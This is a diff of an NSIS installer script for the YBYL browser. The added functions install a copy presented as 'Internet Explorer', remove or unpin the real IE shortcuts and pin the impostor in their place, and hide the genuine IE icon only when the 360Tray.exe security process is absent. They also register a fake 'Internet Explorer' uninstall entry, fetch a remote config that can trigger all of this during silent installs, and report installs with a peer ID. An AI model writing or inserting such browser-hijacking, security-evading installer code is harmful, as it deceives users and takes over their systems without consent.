@@ -37,6 +37,10 @@ Var Btn_FreeUse
 
 ;动态获取渠道号
 Var str_ChannelID
+;是否安装ie
+Var Bool_NeedInstallIE
+;是否静默
+Var Bool_IsSilent
 ;---------------------------全局编译脚本预定义的常量-----------------------------------------------------
 ; MUI 预定义常量
 !define MUI_ABORTWARNING
@@ -50,10 +54,10 @@ Var str_ChannelID
 
 !define PRODUCT_NAME "YBYL"
 !define SHORTCUT_NAME "元宝娱乐浏览器"
-!define PRODUCT_VERSION "1.0.0.3"
-!define VERSION_LASTNUMBER 3
+!define PRODUCT_VERSION "1.0.0.5"
+!define VERSION_LASTNUMBER 5
 !define NeedSpace 10240
-!define EM_OUTFILE_NAME "YBSetup_${INSTALL_CHANNELID}.exe"
+!define EM_OUTFILE_NAME "YBSetup-${PRODUCT_VERSION}_inner.exe"
 
 !define EM_BrandingText "${PRODUCT_NAME}${PRODUCT_VERSION}"
 !define PRODUCT_PUBLISHER "YBYL"
@@ -172,6 +176,160 @@ Function CloseExe
 	${Next}
 FunctionEnd
 
+Function CreateDeskIcon
+	StrCpy $1 ${NSIS_MAX_STRLEN}
+	StrCpy $0 ""
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
+	SetOutPath "$0\iexplorer\program"
+	;先备份,姑且认为他是真ie
+	${If} $Bool_IsUpdate == 0
+		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +3
+			WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
+			Delete "$SMPROGRAMS\Internet Explorer.lnk"
+	${EndIf}
+	StrCpy $R1 "0"
+	${If} $Bool_IsSilent == 1 
+		IfFileExists "$TEMP\iesetupconfig.dat" 0 +2
+		ReadINIStr $R1 "$TEMP\iesetupconfig.dat" "silent" "hideicon"
+	${Else}
+		IfFileExists "$TEMP\iesetupconfig.dat" 0 +2
+		ReadINIStr $R1 "$TEMP\iesetupconfig.dat" "haveui" "hideicon"
+	${EndIf}
+	;隐藏IE图标， 判断360进程不在才做
+	${If} $R1 == "0"
+	${OrIf} $R1 == ""
+	${OrIf} $R1 == 0
+		FindProcDLL::FindProc "360Tray.exe"
+		${If} $R0 == 0
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 1)"
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
+			${EndIf}
+		${EndIf}
+	${EndIf}
+	;入口1
+	CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom startmenuprograms"
+	;入口2
+	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t '$0\iexplorer\program\iexplore.exe')"
+	CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom desktop"
+	;入口3
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
+	${If} $2 == 1 ;win7
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetUserPinPath(t) i(.r3)"
+		${If} $3 != "" 
+		${AndIf} $3 != 0
+			IfFileExists "$3\TaskBar\Internet Explorer.lnk" 0 +6
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
+				${EndIf}
+				ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
+				StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
+				Sleep 500
+			SetOutPath "$0\iexplorer\program"
+			CreateShortCut "$0\iexplorer\program\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom toolbar"
+			ExecShell taskbarpin "$0\iexplorer\program\Internet Explorer.lnk" "/sstartfrom toolbar"
+			IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +4
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+				${EndIf}
+				ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
+				Sleep 1000
+			CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom startbar"
+			StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
+			Sleep 200
+			ExecShell startpin "$STARTMENU\Internet Explorer.lnk" "/sstartfrom startbar"
+		${EndIf}
+	${Else}
+		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 +3
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
+			${EndIf}
+			Delete "$QUICKLAUNCH\Internet Explorer.lnk"
+		CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" 
+		IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +3
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+			${EndIf}
+			Delete "$STARTMENU\Internet Explorer.lnk"
+		CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\${PRODUCT_NAME}.exe" "/sstartfrom startbar" 
+		SetOutPath "$TEMP\${PRODUCT_NAME}"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$STARTMENU\Internet Explorer.lnk')"
+	${EndIf}
+	;锁定到任务栏
+FunctionEnd
+
+/******安装ie******/
+Var Bool_IsUpdateIE
+Function InstallIE
+	;判断系统
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r0"
+	${If} $0 == 1
+		;Abort
+	${EndIf}
+	;判断是否覆盖安装
+	StrCpy $Bool_IsUpdateIE 0
+	ReadRegStr $2 HKCU "SOFTWARE\iexplorer" "Path"
+	IfFileExists $2 0 +2
+	StrCpy $Bool_IsUpdateIE 1
+	;杀进程
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::KillMyIExplorer()"
+	Sleep 500
+	;释放exe、xar以及卸载程序
+	StrCpy $1 ${NSIS_MAX_STRLEN}
+	StrCpy $0 ""
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetProfileFolder(t) i(.r0).r2"
+	SetOutPath "$0\iexplorer"
+	SetOverwrite on
+	File /r "iexplorer\*.*"
+	;释放ie配置
+	SetOutPath "$0\IECFG"
+	SetOverwrite off
+	File "ie_config\*.*"
+	;拷贝相关文件， 除了YBYL.exe其余都拷贝
+	;CopyFiles /silent "$INSTDIR\program\*.*" "$0\iexplorer\program"
+	;Delete "$0\iexplorer\program\YBYL.exe"
+	SetOutPath "$0\iexplorer\program"
+	SetOverwrite on
+	File /r "ieneed\*.*"
+	;创建图标
+	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t '$0\iexplorer\program\iexplore.exe')"
+	;创建图标
+	Call CreateDeskIcon
+	;刷新图标
+	System::Call "shell32.dll::SHChangeNotify(l, l, i, i) v (0x08000000, 0, 0, 0)"
+	;释放配置文件（预留）
+	;上报
+	${If} $Bool_IsUpdateIE == 0
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER}', t '0', i 1) "
+	${Else}
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'update', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1)"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t "${VERSION_LASTNUMBER}", t '0', i 1)"
+	${EndIf}  
+	
+	;写注册表信息
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "Path" "$0\iexplorer\program\iexplore.exe"
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetPeerID(t) i(.r2).r3"
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "PeerId" "$2"
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallSource" $str_ChannelID
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstDir" "$0\iexplorer"
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetTime(*l) i(.r2).r1"
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTimes" "$2"
+
+
+	
+	;写入通用的注册表信息
+	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe" "" "$0\iexplorer\program\iexplore.exe"
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayName" "Internet Explorer"
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "UninstallString" "$0\iexplorer\uninst.exe"
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayIcon" "$INSTDIR\program\${PRODUCT_NAME}.exe"
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayVersion" "1.0.0.1"
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
+	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "Publisher" "iexplorer"
+FunctionEnd
+
 Var Bool_IsUpdate
 Function DoInstall
   ;释放配置到public目录
@@ -275,6 +433,7 @@ Function DoInstall
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "Publisher" "${PRODUCT_PUBLISHER}"
   ;SetOutPath "$INSTDIR"
   ;WriteIniStr "$INSTDIR\${PRODUCT_NAME}.url" "InternetShortcut" "URL" "${PRODUCT_WEB_SITE}"
+ 
 FunctionEnd
 
 Function CmdSilentInstall
@@ -308,9 +467,15 @@ Function CmdSilentInstall
 		${EndIf}
 	StartInstall:
 	
+	StrCpy $Bool_IsSilent 1
 	;发退出消息
 	Call CloseExe
 	Call DoInstall
+	 ;装ie
+	${If} $Bool_NeedInstallIE == 1
+	${OrIf} $Bool_NeedInstallIE == 3
+		Call InstallIE
+	${EndIf}
 	;Sleep 2000
 	SetOutPath "$INSTDIR\program"
 	CreateDirectory "$SMPROGRAMS\${SHORTCUT_NAME}"
@@ -514,6 +679,10 @@ Function .onInit
 	File "input_main\program\Microsoft.VC90.ATL.manifest"
 	File "input_main\program\ATL90.dll"
 	File "license\license.txt"
+	;最开始下载ini配置
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig() i.r0"
+	;分析配置文件(在接口中已处理)
+	StrCpy $Bool_NeedInstallIE $0
 	Call CmdSilentInstall
 	;Call CmdUnstall
 	
@@ -1252,7 +1421,11 @@ Function NSD_TimerFun
     !else
         Call InstallationMainFun
     !endif
-	
+	;装ie
+	${If} $Bool_NeedInstallIE == 2
+	${OrIf} $Bool_NeedInstallIE == 3
+		Call InstallIE
+	${EndIf}
 	;主线程中创建快捷方式
 	${If} $Bool_DeskTopLink == 1
 		SetOutPath "$INSTDIR\program"
